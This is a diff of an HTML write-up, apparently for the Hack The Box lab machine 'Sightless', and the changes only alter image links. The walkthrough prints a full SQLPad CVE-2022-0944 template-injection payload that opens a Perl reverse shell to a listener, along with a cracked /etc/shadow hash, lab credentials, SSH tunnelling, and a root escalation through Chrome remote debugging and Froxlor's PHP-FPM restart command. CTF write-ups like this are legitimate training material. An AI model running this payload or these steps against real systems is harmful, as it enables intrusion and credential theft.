@@ -74,23 +74,23 @@ SF:<span class="hljs-char escape_">\x20</span>being<span class="hljs-char escape
 <span class="hljs-title class_">Nmap</span> <span class="hljs-variable">done</span>: <span class="hljs-number">1</span> <span class="hljs-variable">IP</span> <span class="hljs-title function_">address</span> (<span class="hljs-number">1</span> <span class="hljs-variable">host</span> <span class="hljs-variable">up</span>) <span class="hljs-variable">scanned</span> <span class="hljs-keyword">in</span> <span class="hljs-number">80.98</span> <span class="hljs-variable">seconds</span></code></pre></div>
 <p>Dirsearch finds nothing of value, no subdomains with gobuster found either.</p>
 <p>Main site<br />
-<img src="/_resources/7f57cdac66824668a21c8df524ee1eb9.png" /></p>
+<img src=":/7f57cdac66824668a21c8df524ee1eb9" alt="bd0fadef85d0671250f163b186607e27.png" /></p>
 <p>Walking around the site we can find nice SQLPad site<br />
-<img src="/_resources/7d873517bf15494ca521e19f5bb2af0b.png" /></p>
+<img src=":/7d873517bf15494ca521e19f5bb2af0b" alt="53fa5e1c5517edd1e96b9c02cab5fb7d.png" /></p>
 <p>We can learn its version too.<br />
-<img src="/_resources/175603cd5afc48899a8ab7f6e8f87bdd.png" /></p>
+<img src=":/175603cd5afc48899a8ab7f6e8f87bdd" alt="ee2041c88698c701974376dcdbc7020f.png" /></p>
 <p>Sure enough, there is a <a title="https://nvd.nist.gov/vuln/detail/CVE-2022-0944" href="https://nvd.nist.gov/vuln/detail/CVE-2022-0944">CVE</a> for it (its an easy box after all)</p>
 <h1 id="cve-2022-0944">CVE-2022-0944</h1>
 <p>All of it is described here:<br />
 <a title="https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb" href="https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb">https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb</a></p>
 <p>TLDR: Set listener on port 4444 and add new connection with driver MySQL amd database<code>{{ process.mainModule.require('child_process').exec('perl -e \'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};\'') }}</code>. Nice name.</p>
-<p><img src="/_resources/04102ec0fe654fe191dd328543656658.png" /></p>
+<p><img src=":/04102ec0fe654fe191dd328543656658" alt="cb64d25f37520b15ae2981ebd052ee56.png" /></p>
 <p>We are in. Trying to do standard shell stabilisation with <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code> gives us <code>python3: not found</code>. Whoami gives “root” so we are probably in a container, with flag nowhere in sight.</p>
 <p>Running linenum.sh confirms our fears.</p>
-<p><img src="/_resources/ecde2e2f1bd04149bdf0b9a00833ac12.png" /></p>
+<p><img src=":/ecde2e2f1bd04149bdf0b9a00833ac12" alt="be252ada273258af5239a4080f676c3f.png" /></p>
 <p>It also shows that we have an additional entry in /etc/shadow file. Probably the pass for ssh.</p>
 <p><code>michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::</code></p>
-<p><img src="/_resources/8b9a164c14f943549ce928e8c7a2a8d9.png" /></p>
+<p><img src=":/8b9a164c14f943549ce928e8c7a2a8d9" alt="18193c143571c5930c788eff823f6222.png" /></p>
 <p>Running john gets us:<br />
 blindside        (root)<br />
 insaneclownposse (michael)</p>
@@ -121,9 +121,9 @@ john        1710  3.0  4.5 1186799476 178872 ?   Sl   14<span class="hljs-functi
 <div><pre class="hljs"><code>ssh -L <span class="hljs-number">40373</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">40373</span> michael@<span class="hljs-number">10.129</span>.<span class="hljs-number">160.92</span>
 <span class="hljs-regexp">/usr/</span>bin/google-chrome --remote-debugging-port=<span class="hljs-number">40373</span>
 chrome:<span class="hljs-regexp">//i</span>nspect/<span class="hljs-comment">#devices</span></code></pre></div>
-<p><img src="/_resources/f3560d812ba344a4bf0f3d5ba183d7de.png" /></p>
+<p><img src=":/f3560d812ba344a4bf0f3d5ba183d7de" alt="ef8918583da2d384f2e22ff8ec7d17b7.png" /></p>
 <p>…and it doesnt work.</p>
-<p><img src="/_resources/151bad01c1494a77adfcc2212350455f.png" /></p>
+<p><img src=":/151bad01c1494a77adfcc2212350455f" alt="9015475fe0d1ec2a98f39fb1bc80a605.png" /></p>
 <div><pre class="hljs"><code><span class="hljs-attribute">michael</span>@sightless:~$ ss -tulpn
 <span class="hljs-attribute">Netid</span>           State            Recv-Q           Send-Q                       Local Address:Port                        Peer Address:Port           
 <span class="hljs-attribute">udp</span>             UNCONN           <span class="hljs-number">0</span>                <span class="hljs-number">0</span>                            <span class="hljs-number">127.0.0.53</span>%lo:<span class="hljs-number">53</span>                               <span class="hljs-number">0.0.0.0</span>:*                              
@@ -141,29 +141,29 @@ chrome:<span class="hljs-regexp">//i</span>nspect/<span class="hljs-comment">#de
 <span class="hljs-attribute">tcp</span>             LISTEN           <span class="hljs-number">0</span>                <span class="hljs-number">128</span>                                      *:<span class="hljs-number">21</span>                                     *:*                              
 <span class="hljs-attribute">tcp</span>             LISTEN           <span class="hljs-number">0</span>                <span class="hljs-number">128</span>                                  <span class="hljs-meta"> [::]:22                                  [::]:*                              </span></code></pre></div>
 <p>So tunneling via ssh again <code>ssh -L 8080:127.0.0.1:8080 michael@10.129.160.92</code> gets us:</p>
-<p><img src="/_resources/3c19505935484b9ebee01c4ab14701bc.png" /></p>
+<p><img src=":/3c19505935484b9ebee01c4ab14701bc" alt="8ee576cf739c2a99760281b07a3be779.png" /></p>
 <p>Its the foxlor that we could have read on the main site.</p>
-<p><img src="/_resources/748fc8191f3d4596971c51f5531284a5.png" /></p>
+<p><img src=":/748fc8191f3d4596971c51f5531284a5" alt="c7c74f4f9efbd9e9ba1a8032bd690345.png" /></p>
 <p>After seeing the domain error, I’ve changed address from <code>localhost:8080</code> to <code>127.0.0.1:8080</code> and was greeted with a nice login page.</p>
-<p><img src="/_resources/15b2c26b281f46508bf9f65ef4147850.png" /></p>
+<p><img src=":/15b2c26b281f46508bf9f65ef4147850" alt="4469d072df0336f673cfd0a1dccf85e5.png" /></p>
 <p>Our username and password doesnt work here though. There was no direct exploit, so I’ve went back to exploring ports.</p>
 <p><code>ssh -L 33060:127.0.0.1:33060 \     -L 40517:127.0.0.1:40517 \     -L 34763:127.0.0.1:34763 \     -L 3306:127.0.0.1:3306 \     -L 40373:127.0.0.1:40373 \     michael@10.129.160.92</code></p>
 <p>Trying to add ports again to remote debugger and it works with <code>127.0.0.1:34763</code>.</p>
-<p><img src="/_resources/9dbd8567fd734376beb90d9da39c42db.png" /></p>
+<p><img src=":/9dbd8567fd734376beb90d9da39c42db" alt="7aa897abbfc669351b41bdd546d0ab91.png" /></p>
 <p>Upon clicking inspect, we can see some magic going on. First we can see Froxlor page.</p>
-<p><img src="/_resources/855c3609abc846f489860de4a7fae101.png" /></p>
+<p><img src=":/855c3609abc846f489860de4a7fae101" alt="89dc6def67cbd2c4c8ac8dc67d0f54e7.png" /></p>
 <p>Then we can see the password being typed automaticly, probably by the healthcheck.sh script.We can see then this dashboard and finally we are logged out.</p>
-<p><img src="/_resources/533dd2059583480c8271562030f94830.png" /></p>
+<p><img src=":/533dd2059583480c8271562030f94830" alt="b56882d0eb388ef297c45b01bde85afd.png" /></p>
 <p>We can then press ctrl+e to capture all of the traffic in the inspector and press it again to stop after full cycle. We can inspect all of the packages then in peace. In index.php we can find username <code>Admin</code> and password <code>ForlorfroxAdmin</code>.</p>
-<p><img src="/_resources/820a149f01f04995a306fc77afac0b1c.png" /></p>
+<p><img src=":/820a149f01f04995a306fc77afac0b1c" alt="c8556397f688d804dc37e03e958670f9.png" /></p>
 <p>Going back to the 8080 port and we can log in.</p>
-<p><img src="/_resources/e0f766e3ffd74cdbabc4d9d7d348af5b.png" /></p>
+<p><img src=":/e0f766e3ffd74cdbabc4d9d7d348af5b" alt="7e7062608f2368050cbbbf9a5a4b2422.png" /></p>
 <p>I’ve thinkered for way too long with adding a php reverse shell to the site and then executing it. I’ve tried creating more subdomains too, but none of it worked. I’ve ended up abusing the php-fpm restart command.</p>
-<p><img src="/_resources/e2011b51c32d445cbd10c3d29d79fb49.png" /></p>
+<p><img src=":/e2011b51c32d445cbd10c3d29d79fb49" alt="51719bbf3c807aa45af751a6a51edf8c.png" /></p>
 <p>I’ve tried using also netcat reverse shell, but the -e parameter is blocked. I tried also bash reverse shell, but the use of special chars like “&amp;” and “&gt;” is blocked. That is why I ended up creating it in a file. Then going to Settings &gt;&gt; PHP-FPM allows us to restart it, by toggling the switch on and off.</p>
-<p><img src="/_resources/df0a396a6e9d45638eb849ee2b3299af.png" /></p>
+<p><img src=":/df0a396a6e9d45638eb849ee2b3299af" alt="c57934bbe8040dd21a13d79383ecec56.png" /></p>
 <p>After <strong>waiting for a while</strong>, I got the shell with root access. It is neccessary to wait after each try, as the command is executed every 5 min by a cron job.</p>
-<p><img src="/_resources/0eda38eaf1624a9f8a9709c17d2b14aa.png" /></p>
+<p><img src=":/0eda38eaf1624a9f8a9709c17d2b14aa" alt="8f7424565eda5f009bde4bf52d0997c1.png" /></p>
 <p>Cool box.</p>
 </div>
       </article>
